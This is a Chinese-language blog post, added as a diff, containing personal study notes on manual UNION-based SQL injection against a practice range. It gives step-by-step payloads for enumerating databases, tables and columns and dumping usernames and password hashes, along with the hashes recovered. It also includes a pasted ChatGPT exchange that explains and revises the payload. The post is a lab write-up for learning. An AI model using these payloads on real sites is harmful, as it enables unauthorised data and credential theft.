@@ -1,0 +1,183 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#3 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#3</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-03T04:12:04.000Z" id="date"> 2023-06-03</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-07T07:24:08.784Z" id="updated"> 2023-06-07</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习简单的注入，</p>
+<p>这里直接放上我之前学习的笔记吧</p>
+<span id="more"></span>
+
+<h1 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1 判断注入点"></a>1 判断注入点</h1><p>首先 id&#x3D;1 and 1&#x3D;1</p>
+<p>没改变</p>
+<p>id&#x3D;1 and 1&#x3D;2</p>
+<p>崩了，</p>
+<p>证明此处存在注入点，</p>
+<h1 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2 判断字段数"></a>2 判断字段数</h1><p>order by语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 order by 3<br></code></pre></td></tr></table></figure>
+
+<p>在3的时候崩了，</p>
+<p>后面查询要1，2</p>
+<p>此处不需要 and 1&#x3D;2，</p>
+<p>因为只是为了判断不需要回显，</p>
+<p>但是后面就要了</p>
+<h1 id="3-判断回显点"><a href="#3-判断回显点" class="headerlink" title="3 判断回显点"></a>3 <strong>判断回显点</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 and 1=2 union select 1,2<br></code></pre></td></tr></table></figure>
+
+<p>这里2有回显，</p>
+<p>因此之后的语句将替换2</p>
+<h1 id="4-查询相关内容"><a href="#4-查询相关内容" class="headerlink" title="4 查询相关内容"></a>4 查询相关内容</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 and 1=2 union select 1,database()<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_select.asp">select</a> 语句用于从表中选取数据。<br><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_union.asp">union</a> 操作符用于合并两个或多个 SELECT 语句的结果集</p>
+</blockquote>
+<p>查询出当前数据库是名字maoshe</p>
+<p>然后知道数据库之后获取数据库中的表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1<br></code></pre></td></tr></table></figure>
+<p>获取到表名是admin后,</p>
+<p>查询admin表中的表头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=表名 limit 0,1<br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>database()就是前面获取的数据库名字</li>
+<li>limit见最后，原来以为是平面直角坐标系的原理</li>
+</ul>
+<p>然后获取到表头之后，</p>
+<p>需要找到表头之下的数据，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 and 1=2 union select 1,列名 from 表名 limit 坐标<br></code></pre></td></tr></table></figure>
+
+<p>就ok了！</p>
+<p>拿下管理员和密码</p>
+<h2 id="4-1-0-坑"><a href="#4-1-0-坑" class="headerlink" title="4.1.0 坑"></a>4.1.0 坑</h2><p>这里发现似乎和平面直角坐标系有点不同，</p>
+<p>去搜了一下</p>
+<blockquote>
+<p>limit 3,2”表示从第四行数据开始，取两条数据</p>
+</blockquote>
+<p>原来是这样。。。。</p>
+<p>我像个弱智一样对着excel比划半天。。。</p>
+<p>至此结束！</p>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Genevieve_xiao/article/details/119487157">SQL注入（一）—— sql手动注入实操_Genevieve_xiao的博客-CSDN博客</a></p>
+</blockquote>
+<h1 id="5-实操"><a href="#5-实操" class="headerlink" title="5 实操"></a>5 实操</h1><p>这里去墨客开一个靶场，</p>
+<p>就选那个被蹂躏千百遍的手工注入靶场吧，</p>
+<p>url:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://124.70.91.203:41907/new_list.php?id=tingjigonggao<br></code></pre></td></tr></table></figure>
+
+<h2 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h2><p>首先要一个报错</p>
+<p>这里不是 and 1&#x3D;2报错</p>
+<p>而是添加一个单引号闭合前面的内容，</p>
+<p>因为这个是字符型注入</p>
+<h2 id="order-by判断字段数"><a href="#order-by判断字段数" class="headerlink" title="order by判断字段数"></a>order by判断字段数</h2><p>这里判断到5就报错了，</p>
+<p>说明需要1，2，3，4</p>
+<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>然后构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-tingjigonggao&#x27; union select 1,2,3,4--+<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意！！！！</strong></p>
+<ul>
+<li>最后要–+</li>
+<li>要在停机公告前面加入一个-报错！！！没有这个-死活出不来！！</li>
+</ul>
+<p>发现回显位是2,3</p>
+<p>那么我就选代表我的2吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-tingjigonggao&#x27; union select 1,database(),3,4--+<br></code></pre></td></tr></table></figure>
+
+<p>当前数据库是<strong>mozhe_discuz_stormgroup</strong></p>
+<h2 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1tingjigonggao&#x27; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()--+<br></code></pre></td></tr></table></figure>
+
+<p>然后回显显示是</p>
+<p><strong>notice,stormgroup_member</strong></p>
+<p>前面一个notice是公告的意思，</p>
+<p>一看就不是，</p>
+<p>后面的那个解释为“暴风雪组_成员”。。。。</p>
+<p>我拙劣的英语。。</p>
+<p>反正带member的肯定就是这个了！</p>
+<h2 id="获取表内表头"><a href="#获取表内表头" class="headerlink" title="获取表内表头"></a>获取表内表头</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-tingjigonggao&#x27; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=&quot;stormgroup_member&quot; limit 0,1 --+<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>table_name&#x3D;后面的内容要加双引号！！！！</li>
+</ul>
+<p>获取到表头是</p>
+<p><strong>id,name,password,status</strong></p>
+<p>我们获取的就是name和password</p>
+<h2 id="获取表格内容"><a href="#获取表格内容" class="headerlink" title="获取表格内容"></a>获取表格内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,group_concat(id,0x0a,name,0x0a,password,0x0a,status),3,4 from stormgroup_member--+<br></code></pre></td></tr></table></figure>
+
+<p>这里语句构造的是writeup里面的，</p>
+<p>然后发现他的这个很简单，</p>
+<p>然后chatgpt了一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,group_concat(id,0x0a,name,0x0a,password,0x0a,status),3,4 from stormgroup_member--+ 请讲述一下这个sql注入语句<br><br><br>ChatGPT<br>这个SQL注入语句是一种尝试获取敏感信息的攻击方式。让我为您解释一下这个注入语句的各个部分：<br><br>?id=-1&#x27;：这是一个查询参数，它尝试注入到SQL查询中的id条件中。-1是一个无效的ID，但在这种情况下，它被用作占位符，以便注入其他的SQL代码。<br><br>union select 1,group_concat(id,0x0a,name,0x0a,password,0x0a,status),3,4 from stormgroup_member：这是注入的主要部分，它使用UNION SELECT语句将自定义结果集与原始查询结果合并。在这种情况下，查询的目标是从stormgroup_member表中获取敏感信息。<br><br>1：这是注入的第一个列值，只是用作占位符。<br><br>group_concat(id,0x0a,name,0x0a,password,0x0a,status)：这是注入的第二个列值，它使用group_concat函数将stormgroup_member表中的多个列连接在一起，并用换行符（0x0a）分隔每个字段的值。通过这种方式，攻击者可以获取包含id、name、password和status的所有记录的组合结果。<br><br>3和4：这些是注入的后续列值，只是用作占位符。<br><br>--+：这是用于注释掉SQL查询语句中剩余部分的注释符号。--表示单行注释，它使+后面的内容被忽略。<br><br>通过这个注入语句，攻击者试图在stormgroup_member表中获取每个记录的id、name、password和status字段的值。这种注入攻击对于存在安全漏洞的应用程序是一种常见的攻击方式，因此开发人员应该采取适当的安全措施来防止这种类型的攻击，例如使用参数化查询或输入验证来阻止SQL注入。<br><br><br>User<br>0x0a是什么意思？没有这个东西可以吗<br><br>ChatGPT<br>抱歉，我之前的回答中引入了一些混淆，导致了误解。让我来更正一下。<br><br>0x0a代表十六进制的数值，表示换行符（\n）的ASCII码。在某些情况下，攻击者可能会尝试在数据之间插入换行符，以便在结果中进行分隔。然而，这并不是必需的，且具体使用哪种分隔符取决于数据库和应用程序的配置。<br><br>对于上述的SQL注入语句，你可以尝试将0x0a移除，即使没有这个换行符，依然可以执行注入攻击。修正后的注入语句如下：<br>?id=-1&#x27; union select 1,group_concat(id,name,password,status),3,4 from stormgroup_member--<br>在这种情况下，group_concat函数将id、name、password和status字段的值以默认的分隔符（通常是逗号）连接起来。<br></code></pre></td></tr></table></figure>
+
+<p>那么去掉0x0a也是可以的，</p>
+<p>加上就是为了阅读更加方便一点</p>
+<p>至此就拿到了</p>
+<p><strong>2mozhe356f589a7df439f6f744ff19bb8092c00,1mozhe48f9755b3836822abe14efdd1d2a90d51</strong></p>
+<p>去cmd5试一下就会发现后面那个才是能用的</p>
+<h1 id="6-小结"><a href="#6-小结" class="headerlink" title="6 小结"></a>6 小结</h1><p>基本每一步都是一个报错</p>
+<p>现在我在这里默写一下：</p>
+<ol>
+<li><p>尝试造成报错</p>
+<p>在id&#x3D;后面加上“-”报错，然后使用“ ‘ ” 闭合前面的语句</p>
+</li>
+<li><p>order by 获取获取字段数</p>
+<p>?id&#x3D;-1’ order by n –+</p>
+<p>直到n报错为止</p>
+</li>
+<li><p>注出回显点</p>
+<p>?id&#x3D;-1’ union select 1,2,3,(n-1) –+</p>
+<p>回显哪个数就代表哪个是回显点</p>
+<p>接下来的语句替换其中一个数即可</p>
+</li>
+<li><p>获取数据库名字</p>
+<p>?id&#x3D;-1’ union select 1,group_concat(database()),3,4 –+</p>
+</li>
+<li><p>获取数据库中的表名字</p>
+<p>?id&#x3D;-1’ union select 1,group_concat(table_name),3,4 from information_schema.tables where <strong>table_schema</strong>&#x3D;database() –+</p>
+<p>【注意】是table_schema，不是schema_name，默写的时候这里默错了</p>
+</li>
+<li><p>获取表中的表头</p>
+<p>?id&#x3D;-1’ union select 1,group_concat(<strong>column_name</strong>),3,4 from information_schema.<strong>columns</strong> where table_schema&#x3D;database() and table_name&#x3D;”{前面获取的表}” –+</p>
+<p>【注意】table_name&#x3D;后面要加双引号，最后要–+，默写的时候忘记加了导致报错</p>
+</li>
+<li><p>获取表中的内容</p>
+<p>?id&#x3D;-1’ union select 1,group_concat(id,name,password,status),3,4 from {表名}–+</p>
+</li>
+</ol>
+<p>结束！！！！！</p>
+<h1 id="7-最后"><a href="#7-最后" class="headerlink" title="7 最后"></a>7 最后</h1><p>幸好之前学过了今天的内容对我没有难度</p>
+
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/04/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4/">← Next Sql注入学习笔记#4</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/02/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/">Sql注入学习笔记#2 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">1 判断注入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">2 判断字段数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">3 判断回显点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%9F%A5%E8%AF%A2%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9"><span class="toc-number">4.</span> <span class="toc-text">4 查询相关内容</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-0-%E5%9D%91"><span class="toc-number">4.1.</span> <span class="toc-text">4.1.0 坑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E5%AE%9E%E6%93%8D"><span class="toc-number">5.</span> <span class="toc-text">5 实操</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">5.1.</span> <span class="toc-text">寻找注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">5.2.</span> <span class="toc-text">order by判断字段数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE"><span class="toc-number">5.3.</span> <span class="toc-text">回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8"><span class="toc-number">5.4.</span> <span class="toc-text">获取表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%86%85%E8%A1%A8%E5%A4%B4"><span class="toc-number">5.5.</span> <span class="toc-text">获取表内表头</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E6%A0%BC%E5%86%85%E5%AE%B9"><span class="toc-number">5.6.</span> <span class="toc-text">获取表格内容</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E5%B0%8F%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">6 小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E6%9C%80%E5%90%8E"><span class="toc-number">7.</span> <span class="toc-text">7 最后</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
